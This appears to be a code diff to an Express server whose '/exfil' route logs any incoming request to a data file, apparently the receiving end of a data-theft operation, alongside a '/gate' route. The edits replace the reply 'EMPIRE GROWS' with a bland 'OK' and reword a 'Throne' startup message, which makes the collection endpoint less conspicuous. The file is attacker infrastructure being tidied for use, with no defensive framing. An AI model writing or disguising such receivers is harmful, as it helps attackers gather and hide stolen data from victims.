@@ -2,6 +2,7 @@ const express = require('express');
 const fs = require('fs');
 const path = require('path');
 const app = express();
+
 app.use(express.urlencoded({ extended: true }));
 app.use(express.json());
 app.use(express.static('public'));
@@ -29,7 +30,7 @@ app.all('/exfil', (req, res) => {
   };
   logs.unshift(newLog);
   fs.writeFileSync(dataFile, JSON.stringify(logs, null, 2));
-  res.send('EMPIRE GROWS');
+  res.send('OK');
 });
 
 app.get('/gate', (req, res) => {
@@ -57,4 +58,5 @@ app.get('/avatar/:id', (req, res) => {
   res.redirect(url || 'https://i.imgur.com/removed.png');
 });
 
-app.listen(process.env.PORT || 3000, () => console.log('Throne up'));
+const port = process.env.PORT || 3000;
+app.listen(port, () => console.log(`Throne on ${port}`));
